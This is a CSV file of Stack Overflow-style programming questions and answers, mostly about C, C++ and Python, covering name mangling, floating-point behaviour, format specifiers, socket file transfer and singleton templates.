QUESTION,USERID,USERNAME,ANSWER
"<p>Why doesn't C++ have &lt;cstdfloat> header for floats like it has &lt;cstdint> for integers?</p>

<p><strong>EDIT :</strong></p>

<p>By &lt;cstdfloat> I mean header that provides typedefs for float and double. Much like qreal typedef in Qt. Hope my question is clear now.</p>
","9530","","<p>Are you perhaps looking for <a href=""http://en.wikipedia.org/wiki/Float.h"" rel=""nofollow""><code>&lt;float.h&gt;</code></a> and its C++ brother <code>&lt;cfloat&gt;</code> instead?</p>
"
"<p>I have got a structure and in it a pointer to a 2D array. But when I try to assign an actual 2D array to that pointer I do not succeed - compiler says that my pointer is a pointer to a 1D array.</p>

<p>Here's my code:</p>

<pre><code>typedef GLfloat Vertex2f[2];
typedef GLfloat TextureCoordinate[2];

typedef struct { 
    GLuint texture_name;  // OpenGL ID of texture used for this sprite 
    Vertex2f *vertices; // array of vertices 
    TextureCoordinate *texture_coords; // texture vertices to match

    GLubyte *vertex_indices;
} game_sprite;

void loadState()
{
    game_sprite ballSprite;

    createAndLoadTexture(""ball.png"", &amp;ballSprite.texture_name);

    const Vertex2f tempVerticesArray[4] =  {
        {-100.0f, -100.0f},
        {-100.0f, 100.0f},
        {100.0f, 100.0f},
        {100.0f, -100.0f}
    };

    ballSprite.vertices = &amp;tempVerticesArray; //The problem appears to be here
}
</code></pre>

<p>How can I make it work?</p>

<p>Thanks.</p>
","9530","","<p>You have two problems.  First is that <code>tempVerticesArray</code> is <code>const</code>.  You can't assign a pointer to a <code>const</code> value (<code>&amp;tempVerticesArray</code>) to a pointer to a non-<code>const</code> variable (<code>ballSprite.vertices</code>) without a typecast, so the compiler is complaining.  You should modify the <code>vertices</code> data member to be of the type <code>const Vertex2f *</code>, assuming you're not actually modifying that data ever.</p>

<p>The second problem is that as soon as <code>loadState()</code> ends, the variable <code>tempVerticesArray</code> goes out of scope, and so any dangling pointers to it (specifically <code>ballSprite.vertices</code>) are invalid.  You should make <code>tempVerticesArray</code> a <code>static</code> variable so it's not a stack variable that can go out of scope.  This is assuming that the <code>ballSprite</code> object is used after that function ends, which I'm guessing it does based on context.</p>

<p>If you <em>do</em> need to modify your vertices after initialization, you'll need to allocate for each <code>ballSprite</code> its own set of vertex data (e.g. using <code>malloc()</code>) and copy the vertex data in (e.g. using <code>memcpy()</code>).  If you don't, all <code>ballSprite</code> instances will share a pointer to the same vertex data, and when you modify it, they will all be affected.</p>
"
"<p>I have some piece of code that behaves differently under Mac OSX and Linux (Ubuntu, Fedora, ...). This is regarding type casting in arithmetic operations within printf statements. The code is compiled with gcc/g++.</p>

<p>The following</p>

<pre><code>#include &lt;stdio.h&gt;
int main () {
  float days = (float) (153*86400) / 86400.0;
  printf (""%f\n"", days);
  float foo = days / 30.6;
  printf (""%d\n"", (int) foo);
  printf (""%d\n"", (int) (days / 30.6));
  return 0;
}
</code></pre>

<p>generates on Linux</p>

<pre><code>153.000000
5
4
</code></pre>

<p>and on Mac OSX</p>

<pre><code>153.000000
5
5
</code></pre>

<p>Why?</p>

<p>To my surprise this here works on both Mac OSX and Linux</p>

<pre><code>printf (""%d\n"", (int) (((float)(153 * 86400) / 86400.0) / 30.6));
printf (""%d\n"", (int) (153 / 30.6));
printf (""%.16f\n"",    (153 / 30.6));
</code></pre>

<p>Why? I don't have a clue at all. THX.</p>
","9530","","<p>For starters, read <a href=""http://docs.sun.com/source/806-3568/ncg_goldberg.html"" rel=""nofollow"">What Every Computer Scientist Should Know About Floating-Point Arithmetic</a>.</p>

<p>Because 30.6 is not <strong>exactly</strong> representable in IEEE 754 floating-point, the precise results you get will not be exactly correct.  So you might get slightly less than 5.0 before casting to an integer, and then the integer cast rounds down to 4.</p>

<p>The exact result you get depends on a lot of factors, such as how the intermediate results are being computed.  Your compiler might be generating code to use the x87 floating-point stack, which uses 80-bit registers for intermediate calculations.  Alternatively, you might be using SSE2 (the default on Mac OS X), which uses 128-bit vector registers divided into either 4x32-bit or 2x64-bit.  Check your compiler's assembly output for the type of floating-point operations used.  See <a href=""http://gcc.gnu.org/onlinedocs/gcc-4.0.0/gcc/i386-and-x86_002d64-Options.html"" rel=""nofollow"">this page</a> for a list of GCC command-line options you can use to control the type of floating-point instructions used, particularly the <code>-mfpmath</code> option.</p>
"
"<p>Apart from C++, <strong>which non-toy languages have direct or easy-to-use compatibility to C?</strong>  As in ""I can take a C library out there, and compile my code against it without having to find, write, or configure some kind of wrapper."" </p>

<p>I know that lots of languages have compatibility with C <strong>through some form of external call or binding</strong> (I've been using bindings in Java, Ruby, Python, etc., so I know it can be done).  But you rely on someone (possibly you), to write and maintains a binding for <em>all</em> the libraries you want to use, and the binding has to works on all platforms, etc.</p>

<p>Do more expressive languages than C++ have this feature?</p>

<p><em>Thanks to all for the mentions of swig or related wrapper-generation tools.
I am aware that those exists, but I don't think they're really as easy as C->C++ integration... but then integrating with C might be the only thing that is easier in C++ ;) )</em></p>
","9530","","<p>The <a href=""http://www.digitalmars.com/d/"" rel=""nofollow"">D language</a> is compatible with the C ABI.  However, it's sometimes non-trivial to convert C header files into compatible D modules.  See <a href=""http://www.digitalmars.com/d/2.0/htomodule.html"" rel=""nofollow"">this page</a> for more details.</p>
"
"<p>my program generates random numbers with up to 6 digits with </p>

<pre><code>int number = arc4random % 1000000;
</code></pre>

<p>I want that my program do something when a number like 66 or 4444 or 77777 appears (<em>multidigit number with all digits identical</em>). I could manual write:</p>

<pre><code>    switch (number) {
    case 11: blabla...;
    case 22: blabla...;
    (...)
    case 999999: blabla;
}
</code></pre>

<p>That would cost me many program code. (45 cases...)</p>

<p>Is there an easy way to solve the problem.</p>
","9530","","<p>Here's one way to check that all digits are the same:</p>

<pre><code>bool AllDigitsIdentical(int number)
{
    int lastDigit = number % 10;
    number /= 10;
    while(number &gt; 0)
    {
        int digit = number % 10;
        if(digit != lastDigit)
            return false;
        number /= 10;
    }

    return true;
}
</code></pre>
"
"<p>I am trying to figure out why when I convert my main.m file to a main.mm file, it no longer will link properly.</p>

<p>I have reduces the problem to the following example code:</p>

<pre><code>#import &lt;Foundation/Foundation.h&gt;
#import &lt;AppKit/AppKit.h&gt;
int main( int argc, const char ** argv ) {
return NSApplicationMain( argc, argv);
}
</code></pre>

<p>I am using gnustep and linux.  I enter the following commands and everything works as expected:</p>

<p>g++ -g -c main.m -I/usr/GNUstep/Local/Library/Headers -I/usr/GNUstep/System/Library/Headers</p>

<p>g++ -g -o test main.o -L/usr/GNUstep/Local/Library/Libraries -L/usr/GNUstep/System/Library/Libraries -lgnustep-base -lgnustep-gui</p>

<p>Now if I rename main.m to main.mm and use these two commands ( same exept main.m now main.mm):</p>

<p>g++ -g -c main.mm -I/usr/GNUstep/Local/Library/Headers -I/usr/GNUstep/System/Library/Headers</p>

<p>g++ -g -o test main.o -L/usr/GNUstep/Local/Library/Libraries -L/usr/GNUstep/System/Library/Libraries -lgnustep-base -lgnustep-gui</p>

<p>I get the following error:
main.mm:7: undefined reference to `NSApplicationMain(int, char const**)'</p>

<p>Can someone please find what I am doing wrong?  I do not see why it is now failing to link.</p>

<p>I am trying to add some C++ classes to an objective c program and this is preventing me from continuing.</p>

<p>Thank you for any help you can provide.</p>
","9530","","<p>The problem is that when you compile it as C++, the compiler <a href=""http://en.wikipedia.org/wiki/Name_mangling"">mangles the name</a> of the symbol <code>NSApplicationMain</code>, so it can't find it, since it's looking for something like <code>__Z17NSApplicationMainiPPKc</code>.  You can use the <code>nm</code> program (from binutils) to see what symbols the object files are referencing:</p>

<pre><code>$ # When compiled as Objective-C:
$ nm main.o | grep NSApplicationMain
                 U NSApplicationMain
$ # When compiled as Objective-C++:
$ nm main.o | grep NSApplicationMain
                 U _Z17NSApplicationMainiPPKc
</code></pre>

<p>In order to avoid this problem, C functions need to be declared with an <a href=""http://www.parashift.com/c++-faq-lite/mixing-c-and-cpp.html#faq-32.3""><code>extern ""C""</code></a> modifier in order to tell the compiler not to mangle the name.  Looking into <code>&lt;AppKit/NSApplication.h&gt;</code>, the header file where <code>NSApplicationMain</code> is declared, I see this:</p>

<pre><code>APPKIT_EXPORT int
NSApplicationMain(int argc, const char **argv);
</code></pre>

<p>Alas, <code>APPKIT_EXPORT</code> is defined to be one of <code>extern</code>, <code>__declspec(dllexport)</code>, <code>extern __declspec(dllexport)</code>, or nothing in <code>&lt;AppKit/AppKitDefines.h&gt;</code>.  Since it's also used for global variable declarations, we can't get around this by redefining it to <code>extern ""C""</code> (which would be extremely hacky and kludgy anyways).  The AppKit header files do not seem to contain any <code>extern ""C""</code> declarations at all, although I do see them in various header files under <code>Foundation/</code> and <code>GNUStepBase/</code>.</p>

<p>So what can you do?  The solution is to wrap your includes with an <code>extern ""C""</code>:</p>

<pre><code>extern ""C""
{
#import &lt;Foundation/Foundation.h&gt;
#import &lt;AppKit/AppKit.h&gt;
}

int main( int argc, const char ** argv ) {
  return NSApplicationMain( argc, argv);
}
</code></pre>

<p>This will give the functions defined in those header files the proper linkage, and it will all work out.  But you shouldn't have to do this -- I would file a bug report with GNUstep, telling them to add proper <code>extern ""C""</code> declarations to their header files.</p>
"
"<p>I want to display:</p>

<p><code>49</code> as <code>49.00</code></p>

<p>and:</p>

<p><code>54.9</code> as <code>54.90</code></p>

<p>Regardless of the length of the decimal or whether there are are any decimal places, I need to display the number with 2 decimal places, and I'd like to do it in an efficient way. The purpose is to display money values.</p>

<p>eg, <code>4898489.00</code></p>
","9530","","<p>You can use the <a href=""http://docs.python.org/library/stdtypes.html#string-formatting"">string formatting operator</a> as so:</p>

<pre><code>f = 49
x = ""%.2f"" % f  # x is now the string ""49.00""
</code></pre>

<p>I'm not sure what you mean by ""efficient"" -- this is almost certainly <em>not</em> the bottleneck of your application.  If your program is running slowly, profile it first to find the hot spots, and then optimize those.</p>
"
"<p>I want to retrieve the bit depth for a jpeg file using Python.</p>

<p>Using the Python Imaging Library:</p>

<pre><code>import Image
data = Image.open('file.jpg')
print data.depth
</code></pre>

<p>However, this gives me a depth of 8 for an obviously 24-bit image. Am I doing something wrong? Is there some way to do it with pure Python code?</p>

<p>Thanks in advance.</p>

<p>Edit: It's data.bits not data.depth.</p>
","9530","","<p>I don't see the <code>depth</code> attribute documented anywhere in the <a href=""http://www.pythonware.com/library/pil/handbook/index.htm"">Python Imaging Library handbook</a>.  However, it looks like only a limited number of <a href=""http://www.pythonware.com/library/pil/handbook/concepts.htm"">modes</a> are supported.  You could use something like this:</p>

<pre><code>mode_to_bpp = {'1':1, 'L':8, 'P':8, 'RGB':24, 'RGBA':32, 'CMYK':32, 'YCbCr':24, 'I':32, 'F':32}

data = Image.open('file.jpg')
bpp = mode_to_bpp[data.mode]
</code></pre>
"
"<p>I have a simple function template:</p>

<pre><code>#include &lt;iostream&gt;
using namespace std;

template &lt;class T&gt;
T GetMax (T a, T b) {
  T result;
  result = (a &gt; b) ? a : b;
  return (result);
}

int main () {
  cout &lt;&lt; GetMax&lt;int&gt;(5, 6) &lt;&lt; endl;
  cout &lt;&lt; GetMax&lt;long&gt;(10, 5) &lt;&lt; endl;
  return 0;
}
</code></pre>

<p>The above example will generate 2 function template instantiations, one for <em>int</em> and another for <em>long</em>. Is there any g++ option to view the function template instantiations?</p>
","9530","","<p>You can use the <code>nm</code> program (part of <a href=""http://www.gnu.org/software/binutils/"">binutils</a>) to see the list of symbols used by your program.  For example:</p>

<pre><code>$ g++ test.cc -o test
$ nm test | grep GetMax
00002ef0 T __Z6GetMaxIiET_S0_S0_
00002f5c T __Z6GetMaxIiET_S0_S0_.eh
00002f17 T __Z6GetMaxIlET_S0_S0_
00002f80 T __Z6GetMaxIlET_S0_S0_.eh
</code></pre>

<p>I don't know why each one has two copies, one with a <code>.eh</code> suffix, but otherwise you can tell that this particular function was instantiated twice.  If you version of <code>nm</code> supports the <code>-C/--demangle</code> flag, you can use that to get readable names:</p>

<pre><code>$ nm --demangle test | grep GetMax
00002ef0 T int GetMax&lt;int&gt;(int, int)
00002f5c T _Z6GetMaxIiET_S0_S0_.eh
00002f17 T long GetMax&lt;long&gt;(long, long)
00002f80 T _Z6GetMaxIlET_S0_S0_.eh
</code></pre>

<p>If that option isn't supported, you can use <a href=""http://sourceware.org/binutils/docs-2.16/binutils/c_002b_002bfilt.html""><code>c++filt</code></a> to demangle them:</p>

<pre><code>$ nm test | grep GetMax | c++filt
00002ef0 T int GetMax&lt;int&gt;(int, int)
00002f5c T __Z6GetMaxIiET_S0_S0_.eh
00002f17 T long GetMax&lt;long&gt;(long, long)
00002f80 T __Z6GetMaxIlET_S0_S0_.eh
</code></pre>

<p>So, you can see that <code>GetMax</code> was instantiated with <code>int</code> and <code>long</code> respectively.</p>
"
"<p>I know that there are already several questions on StackOverflow about <code>std::string</code> versus <code>std::wstring</code> or similar but none of them proposed a full solution. </p>

<p>In order to obtain a good answer I should define the requirements:</p>

<ul>
<li><strong>multiplatform</strong> usage, must work on Windows, OS X and Linux</li>
<li>minimal effort for <strong>conversion to/from platform specific Unicode strings</strong> like <code>CFStringRef</code>, <code>wchar_t *</code>, <code>char*</code> as UTF-8 or other types as they are required by OS API. Remark: I don't need code-page convertion support because I expect to use only Unicode compatible functions on all operating systems supported.</li>
<li>if requires an external library, this one should be <strong>open-source</strong> and under a very liberal license like BSD but not LGPL.</li>
<li>be able to use a <strong>printf format</strong> syntax or similar.</li>
<li>easy way of string allocation/deallocation </li>
<li>performance is not very important because I assume that the Unicode strings are used only for application UI.</li>
<li>some example could would be appreciated</li>
</ul>

<p>I would really appreciate only <strong>one proposed solution per answer</strong>, by doing this people may vote for their prefered alternative. If you have more than one alternative just add another answer.</p>

<p>Please indicate something that <strong>did worked for you</strong>.</p>

<p>Related questions:</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/402283/stdwstring-vs-stdstring"">stdwstring-vs-stdstring</a></li>
<li><a href=""http://stackoverflow.com/questions/621635/does-c0x-support-stdwstring-conversion-to-from-utf-8-byte-sequence"">does-c0x-support-stdwstring-conversion-to-from-utf-8-byte-sequence</a></li>
<li><a href=""http://stackoverflow.com/questions/467139/portable-wchart-in-c"">portable-wchart-in-c</a></li>
</ul>
","9530","","<p>I would strongly recommend using UTF-8 internally in your application, using regular old <code>char*</code> or <code>std::string</code> for data storage.  For interfacing with APIs that use a different encoding (ASCII, UTF-16, etc.), I'd recommend using <a href=""http://www.gnu.org/software/libiconv/"">libiconv</a>, which is licensed under the LGPL.</p>

<p>Example usage:</p>

<pre><code>class TempWstring
{
public:
  TempWstring(const char *str)
  {
    assert(sUTF8toUTF16 != (iconv_t)-1);
    size_t inBytesLeft = strlen(str);
    size_t outBytesLeft = 2 * (inBytesLeft + 1);  // worst case
    mStr = new char[outBytesLeft];
    char *outBuf = mStr;
    int result = iconv(sUTF8toUTF16, &amp;str, &amp;inBytesLeft, &amp;outBuf, &amp;outBytesLeft);
    assert(result == 0 &amp;&amp; inBytesLeft == 0);
  }

  ~TempWstring()
  {
    delete [] mStr;
  }

  const wchar_t *Str() const { return (wchar_t *)mStr; }

  static void Init()
  {
    sUTF8toUTF16 = iconv_open(""UTF-16LE"", ""UTF-8"");
    assert(sUTF8toUTF16 != (iconv_t)-1);
  }

  static void Shutdown()
  {
    int err = iconv_close(sUTF8toUTF16);
    assert(err == 0);
  }

private:
  char *mStr;

  static iconv_t sUTF8toUTF16;
};

iconv_t TempWstring::sUTF8toUTF16 = (iconv_t)-1;

// At program startup:
TempWstring::Init();

// At program termination:
TempWstring::Shutdown();

// Now, to convert a UTF-8 string to a UTF-16 string, just do this:
TempWstring x(""Entr\xc3\xa9""""e"");  // ""Entrée""
const wchar_t *ws = x.Str();  // valid until x goes out of scope

// A less contrived example:
HWND hwnd = CreateWindowW(L""class name"",
                          TempWstring(""UTF-8 window title"").Str(),
                          dwStyle, x, y, width, height, parent, menu, hInstance, lpParam);
</code></pre>
"
"<p>I am building a server-client program with c and having some problen wtih sendina a whole file with  send() and recv() function. I need to send the whole file with these but all these functions can do is send a string. The main problem is with sending the exe or other binary formet data. Should I use htons or htonl func? I dunno how to use those along these as I am merely a noob. </p>

<p>I am stuck with this and love your help. Thanks!!</p>

<p>Here is the server side recv function ::</p>

<pre><code>if (socket_type != SOCK_DGRAM)
    {

            fi = fopen (final,""wb"");
            retval = recv(msgsock, recv_buf, strlen(recv_buf), 0);
            /*recv_buf[retval] = '\0';
            fprintf (fi,""%s"",recv_buf);*/

            int i;
            i=atoi(recv_buf);
            char *q;
            q=(char *)malloc(i*sizeof(char));
            retval = recv(msgsock, q, strlen(q), 0);
            //printf (""%s"",q);
            fwrite(q,i,1,fi);
            fclose(fi);

    }
    else
    {
        retval = recvfrom(msgsock,recv_buf, sizeof(recv_buf), 0, (struct sockaddr *)&amp;from, &amp;fromlen);
        printf(""Server: Received datagram from %s\n"", inet_ntoa(from.sin_addr));
        printf (""SOCK_DGRAM"");
    }

    if (retval == SOCKET_ERROR)
    {
        fprintf(stderr,""Server: recv() failed: error %d\n"", WSAGetLastError());
        closesocket(msgsock);
        //continue;
    }
    else
        printf(""Server: recv() is OK.\n"");

    if (retval == 0)
    {
        printf(""Server: Client closed connection.\n"");
        closesocket(msgsock);
            //continue;
    }
    printf(""Server: Received %d bytes, data from client\n"", retval);
</code></pre>

<p>The client side sending function :::</p>

<p>void send_command()
{
    int bytesent;
    FILE *file_out;
    //file_out = fopen(file_path,""rb"");
    char str_all[100000];//flag [30]=""end"";</p>

<pre><code>///////////////////////getsize//////////////
char fsize[5];
int filesize;
file_out = fopen(file_path, ""rb"");
fseek(file_out, 0, SEEK_END);
filesize = ftell(file_out);
rewind (file_out);
itoa (filesize,fsize,10);
/////////////////////////////////////////////
send (ConnectSocket, fsize, strlen (fsize), 0);

char *r = (char *)malloc (filesize * sizeof(char));

fread(r,filesize,1,file_out);
bytesent = send( ConnectSocket, r, strlen(r), 0 );
printf(""\nClient: Bytes sent: %ld\n"", bytesent);
fclose (file_out);

/*while (fscanf(file_out,""%s"",&amp;str_all) != EOF)
{
    bytesent = send( ConnectSocket, str_all, strlen(str_all), 0 );
    printf(""\nClient: Bytes sent: %ld\n"", bytesent);
    //Sleep(500);
}*/

/*printf(""%s"",flag);
send( ConnectSocket, flag, strlen(flag), 0 );*/
WSACleanup();
//return 0;
}
</code></pre>
","9530","","<p>You'll need to implement that functionality yourself, or use a library that does so.  <code>send(2)</code> just sends a raw byte buffer.  If you want to send a file, you'll need to use some sort of <em>protocol</em> that both the client and the server understand.</p>

<p>The simplest possible protocol might be to have the client send the filename, the length of the file, and then the raw file data.  For example (error checking omitted for clarity):</p>

<pre><code>// Server:
const char *filename = ...;
uint32_t filenameLen = strlen(filename);
uint32_t filenameLenNet = htonl(filenameLen);
send(fd, &amp;filenameLenNet, sizeof(filenameLenNet), 0);
send(fd, filename, filenameLen, 0);

// You should probably use a 64-bit file length; also, for large files, you
// don't want to read the entire file into memory, you should just stream it
// from disk to network in reasonably-sized chunks.
const void *fileData = ...;
uint32_t fileLen = ...;
uint32_t fileLenNet = htonl(fileLen);
send(fd, &amp;fileLenNet, sizeof(fileLenNet), 0);
send(fd, fileData, fileLen, 0);

// Client:
char *filename;
uint32_t filenameLen;
recv(fd, &amp;filenameLen, sizeof(filenameLen), 0);
filenameLen = ntohl(filenameLen);
filename = malloc(filenameLen + 1);
recv(fd, filename, filenameLen, 0);
filename[filenameLen] = 0;
uint32_t fileLen;
recv(fd, &amp;fileLen, sizeof(fileLen), 0);
fileLen = ntohl(fileLen);
void *fileData = malloc(fileLen);
recv(fd, fileData, fileLen, 0);
// Write file Data to the output file.  Again, for large files, it would be
// better to stream it in in chunks instead of reading it all in at once.
</code></pre>

<p>Also, be careful about partial sends/receives.  Make sure you check the return values from <code>send</code> and <code>recv</code>, since they can (and do) often only send or receive a subset of the data you intent to send or receive.  When that happens, you have to recover by resending or rereceiving in a loop until you've processed all the data you intended or an error occurs.</p>

<p>As an alternative to using your own protocol, you can use an existing protocol with a library such as <a href=""http://sourceforge.net/projects/libftp/"" rel=""nofollow"">libftp</a> or <a href=""http://curl.haxx.se/"" rel=""nofollow"">libcurl</a>.</p>
"
"<p>I'm playing around with an eager-initializing generic singleton class. The idea is that you inherit publicly from the class like so:</p>

<pre><code>class foo : public singleton&lt;foo&gt; { };
</code></pre>

<p>I've learned a lot in the process but I'm stuck right now because it's breaking my Visual Studio 2008 linker. The problem is with the static instance member and/or its initialization.</p>

<pre><code>template&lt;class T&gt;
class singleton {
    singleton();
    singleton(singleton const &amp;);
    singleton &amp; operator = (singleton const &amp;);
public:
    static T &amp; instance;
};
template&lt;class T&gt; T &amp; T::instance;
</code></pre>

<p>Any insight would be greatly appreciated!</p>

<p>EDIT:</p>

<p>With this class declaration...</p>

<pre><code>template&lt;class T&gt;
class singleton {
    singleton();
    singleton(singleton const &amp;);
    singleton &amp; operator = (singleton const &amp;);
public:
    static T instance;
};
template &lt;class T&gt; T singleton&lt;T&gt;::instance;
</code></pre>

<p>When I try to do this...</p>

<pre><code>class foo : public singleton&lt;foo&gt; { };
</code></pre>

<p>I get this error...</p>

<blockquote>
  <p>error C2248: 'singleton::singleton'
  : cannot access private member
  declared in class 'singleton'</p>
  
  <p>...</p>
  
  <p>This diagnostic occurred in the compiler generated function 'foo::foo(void)'</p>
</blockquote>

<p>My interpretation is that singleton wants to construct a foo object which, by inheritance, depends on the construction of a singleton whose constructor is private. I figured singleton would have access to its own constructor but I guess not. Any ideas?</p>

<p>EDIT 2:</p>

<p>I've realized that the approach of inheriting from <code>singleton&lt;T&gt;</code> has the problem of requiring change to the class to be used as a singleton. I've ended up with the following code for my eager-initializing singleton class template.</p>

<pre><code>template&lt;typename T&gt;
class singleton_wrapper {
    singleton_wrapper();
    singleton_wrapper(singleton_wrapper const &amp;);
    singleton_wrapper &amp; operator = (singleton_wrapper const &amp;);
    static T instance;
    template&lt;typename T&gt; friend T &amp; singleton();
};
template&lt;typename T&gt; T singleton_wrapper&lt;T&gt;::instance;

template&lt;typename T&gt;
T &amp; singleton() {
    return singleton_wrapper&lt;T&gt;::instance;
}
</code></pre>

<p>For class...</p>

<pre><code>class foo {
public:
    void bar() { }
};
</code></pre>

<p>...One would access a single instance of it (initialized before main()) using the following:</p>

<pre><code>singleton&lt;foo&gt;().bar();
</code></pre>

<p>Thanks again for the help, especially GMan. I'm very pleased with my first experience on stack*<em>overflow</em>*.</p>
","9530","","<p>You can't, since you don't have a concrete instance.  You can need to create an actual instance that you can refer to:</p>

<pre><code>template &lt;class T&gt;
class singleton {
    ...
private:
    static T instance_;
public:
    static T&amp; instance;
};
template &lt;class T&gt; T singleton&lt;T&gt;::instance_;
template &lt;class T&gt; T&amp; singleton&lt;T&gt;::instance = singleton&lt;T&gt;::instance;
</code></pre>

<p>Or, more simply, just ditch the reference altogether:</p>

<pre><code>template &lt;class T&gt;
class singleton {
    ...
public:
    static T instance;
};
template &lt;class T&gt; T singleton&lt;T&gt;::instance;
</code></pre>
"
"<p>If I have a function that performs some procedure and then needs to return the truth value of something is there a compelling reason to use either a boolean variable, or an int variable, as the return type?  </p>

<pre><code>bool Foo()
{
  ...
  ...
  return truthValue;
}

int Foo()
{
  ...
  ...
  return truthValue;
}
</code></pre>

<p>Is there an appreciable difference between these two functions?  What are some potential pitfalls and advantages to both of them?</p>

<p>thanks,</p>

<p>nmr</p>
","9530","","<p>Use <code>bool</code> -- it more clearly conveys the semantic meaning of your code.  If another developer reads your code and sees a return type of <code>bool</code>, he immediately understands that it returns a truth value.  If instead he sees that it returns an <code>int</code>, he has to dig a little further and spend more time figuring out the interface to the function (e.g. reading documentation or reading the code), which slows him down.</p>

<p>The only reason to use <code>int</code> is if you need to interface with legacy code and/or conform to a particular interface (e.g. your function gets its address taken and passed to a third-party library that expects a function of a certain prototype).</p>
"
"<p>Are multi-line macros supported(compilable) in gcc version 3.2.4. I am trying to build my source which has multi-line macros on a linux host using above mentioned gcc version.
I get compilation error at the macro, which is multiline.</p>

<pre><code>      #define YYCOPY(To, From, Count)       \
      do                    \
     {                  \
       YYSIZE_T yyi;                \
       for (yyi = 0; yyi &lt; (Count); yyi++)  \
         (To)[yyi] = (From)[yyi];       \
     }                  \
      while (0)
</code></pre>

<p>If they are not supported, what is the workaround for this, converting the macro to a function or some other compiler option can help?</p>

<p>thank you.</p>

<p>-AD</p>
","9530","","<p>The ANSI C specification requires compilers to support this -- specifically, the standard says that if a line ends in a backslash immediately before the newline, the preprocessor is to treat that line and the subsequent line as one logical line, as if both the backslash and the newline did not exist.  If a preprocessor does not do this, it is not a conforming preprocessor (or more technically, a <em>translator</em>, as the standard calls it).</p>

<p>GCC strives to be as conforming as possible to the ANSI C standard.  Yes, it support multiline macros defined with backslashes at the end of lines.</p>

<p>The reason you're getting compiler errors is something else.  You're not using the macro properly.  Without posting the exact error messages you're receiving and the code which invokes the macro, it's impossible to say what you're doing wrong.</p>
"
"<p>I am writing a python script in windows. I want to do something based on the file size. For example, if the size is greater than 0, I will send email to somebody, otherwise continue to other things. How do I check the file size?</p>
","9530","","<p>Use <a href=""http://docs.python.org/library/os.html#os.stat""><code>os.stat</code></a>, and use the <code>st_size</code> member of the resulting structure:</p>

<pre><code>&gt;&gt;&gt; import os
&gt;&gt;&gt; statinfo = os.stat('somefile.txt')
&gt;&gt;&gt; statinfo
(33188, 422511L, 769L, 1, 1032, 100, 926L, 1105022698,1105022732, 1105022732)
&gt;&gt;&gt; statinfo.st_size
926L
</code></pre>
"
"<p>Does anyone know of an already-written Python script, tool, or editor that will check for unbalanced multi-line tokens? (parentheses, quotes, {}, [], etc.)</p>

<p>I've been writing Python code in IDLE, and every so often I'll get ""EOF token in multi-line statement"" and start swearing, because it means that somewhere in about 200 lines of code I forgot a closing parenthesis or quote and IDLE can't tell me where.  This seems like a fairly straightforward thing, I just don't really have the time or headspace to work it out myself right now.</p>

<p>Much thanks</p>
","9530","","<p><a href=""http://www.gnu.org/software/emacs/"" rel=""nofollow"">emacs</a> will automatically highlight matching pairs of parentheses/brackets/quotes/etc. as you type them, and it will inform you immediately if you mismatch them (e.g. if you type a <code>[</code> followed by a <code>)</code>).  I'm sure vim also does this, but since I don't use vim, I can't say with certainty.</p>
"
"<p>I want to print out a variable for type size_t in c but it appears that size_t is aliased to different variable types on different architextures. For example on one machine (64-bit) the following code does not throw any warmings:</p>

<pre><code>size_t size = 1;
printf(""the size is %ld"", size);
</code></pre>

<p>but on my other machine (32_bit) the above code produces the following warning message:</p>

<blockquote>
  <p>warning: format '%ld' expects type
  'long int *', but argument 3 has type
  'size_t *'</p>
</blockquote>

<p>I suspect this is due to the fact that one machine is 64-bit and the other is 32-bit, so that on my 64-bit machine size_t is aliased to a long int (%ld), whereas on my 32-bit machine size_t is aliased to another type. </p>

<p>Is there a format specifier specifically for size_t?</p>
","9530","","<p>Yes: use the <code>z</code> length modifier:</p>

<pre><code>size_t size = sizeof(char);
printf(""the size is %zd\n"", size);  // decimal size_t
printf(""the size is %zx\n"", size);  // hex size_t
</code></pre>

<p>The other length modifiers that are available are <code>hh</code> (for <code>char</code>), <code>h</code> (for <code>short</code>), <code>l</code> (for <code>long</code>), <code>ll</code> (for <code>long long</code>), <code>j</code> (for <code>intmax_t</code>), <code>t</code> (for <code>ptrdiff_t</code>), and <code>L</code> (for <code>long double</code>).  See §7.19.6.1 (7) of the C99 standard.</p>
"
